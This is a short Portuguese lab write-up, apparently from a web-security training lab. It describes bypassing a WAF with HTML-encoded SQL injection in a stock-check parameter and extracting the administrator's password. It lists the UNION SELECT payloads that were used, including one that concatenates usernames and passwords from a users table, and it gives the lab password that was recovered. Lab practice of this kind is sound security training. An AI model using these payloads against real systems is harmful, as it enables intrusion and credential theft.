## Objetivo
Explorar a vulnerabilidade do Check stock para fazer uma injeção encodada em HTML para bypass o WAF e capturar a senha de ``administrator``

## Vulnerabilidade Identificada
O parâmetro ``stockCheck`` é vulneravel a SQLi encodada com HTML o WAF não barra por não interpretar como um ataque



## Metodologia
Inicialmente procurei achar o numero de colunas da query com ``1 UNION SELECT NULL--`` 
<img width="1835" height="949" alt="Screenshot From 2026-05-03 21-06-09" src="https://github.com/user-attachments/assets/54827c9d-d1e2-42e5-8034-8b8836febe23" />
<br>
<img width="1854" height="927" alt="Screenshot From 2026-05-03 12-15-01" src="https://github.com/user-attachments/assets/0c3ef7c0-63f1-4b3b-aaa2-100ea273339e" />


<br>
<br>
Após identificar como uma, montei a SQLi final com 1 UNION SELECT CONCAT(username,'~',password) FROM users--
<img width="1859" height="954" alt="Screenshot From 2026-05-03 12-23-51" src="https://github.com/user-attachments/assets/2843f47b-993d-4f06-9681-05ccb9d7640c" />

<br>
<br>
<img width="1859" height="954" alt="Screenshot From 2026-05-03 12-24-01" src="https://github.com/user-attachments/assets/d7e1a8a1-53a3-4fe4-8484-dae334b81dae" />
<br>
<br>


## Comandos Utilizados

``1 UNION SELECT NULL--`` 

``1 UNION SELECT CONCAT(username,'~',password) FROM users--``


## Resultado
user: administrator   password:a28t0caqw6sx38yibyw3

## Lições Aprendidas
Aprendi que dependendo do WAF é possivel fazer bypass mascarando a SQLi com encode.
Aprendi também que o ' do começo das SQLi anteriores era especifico pra expressões de string e para expressões numericas usa-se apenas o payload
e 0 units pode ser resultado vazio ou erro silencioso do banco

